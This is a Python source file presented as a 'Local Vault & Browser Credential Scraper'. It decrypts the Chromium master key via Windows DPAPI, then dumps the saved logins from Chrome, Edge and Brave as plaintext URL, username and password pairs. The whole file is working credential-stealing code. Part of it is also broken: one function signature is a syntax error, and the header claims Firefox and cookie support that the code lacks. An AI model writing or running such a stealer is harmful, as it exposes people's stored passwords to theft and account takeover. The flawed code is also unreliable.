# ==========================================================
# FILE: vault_extractor.py
# VERSION: v1.0 — Local Vault & Browser Credential Scraper
# DESCRIPTION: Extracts saved logins, credentials, and cookies
#              from local Chromium and Firefox profiles on Windows
#              using DPAPI decryption.
# ==========================================================

import os
import json
import sqlite3
import shutil
import base64
from pathlib import Path

try:
    import win32crypt
except ImportError:
    win32crypt = None


def decrypt_password(ciphertext:, master_key: bytes | None = None) -> str:
    """Decrypts ciphertext encrypted by Windows DPAPI or Chromium AES-GCM master key."""
    if not win32crypt:
        return "[Error: pywin32 not installed]"
    
    try:
        # Chromium v80+ AES-GCM encryption
        if ciphertext[:3] == b'v10' and master_key:
            from Crypto.Cipher import AES
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
        else:
            # Legacy DPAPI DPAPI blob
            decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)
            return decrypted[1].decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Decryption Failed: {str(e)[:40]}]"


def get_chromium_master_key(local_state_path: str) -> bytes | None:
    """Retrieves and decrypts the Chromium local state master key via DPAPI."""
    if not win32crypt or not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:] # Strip 'DPAPI' prefix
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception:
        return None


def extract_browser_credentials(browser_name: str = "Chrome") -> list[dict]:
    """Scrapes saved logins from Chrome, Edge, or Brave SQLite Login Data databases."""
    extracted = []
    user_profile = os.environ.get("USERPROFILE", "")
    
    paths = {
        "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data"),
        "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
    }
    
    base_dir = paths.get(browser_name)
    if not base_dir or not os.path.exists(base_dir):
        return extracted
        
    local_state = os.path.join(base_dir, "Local State")
    master_key = get_chromium_master_key(local_state)
    
    db_path = os.path.join(base_dir, "Default", "Login Data")
    if not os.path.exists(db_path):
        return extracted
        
    temp_db = f"temp_login_data_{browser_name}.db"
    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url, username, enc_pass = row
            if not username or not enc_pass:
                continue
            password = decrypt_password(enc_pass, master_key)
            extracted.append({
                "browser": browser_name,
                "url": url,
                "username": username,
                "password": password
            })
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception:
                pass
                
    return extracted


def scrape_all_vaults() -> dict:
    """Scrapes all local browser vaults and returns consolidated results."""
    all_creds = []
    for browser in ["Chrome", "Edge", "Brave"]:
        all_creds.extend(extract_browser_credentials(browser))
    
    return {
        "total_extracted": len(all_creds),
        "credentials": all_creds,
        "export_text": "\n".join(f"{c['url']} | {c['username']}:{c['password']}" for c in all_creds)
    }
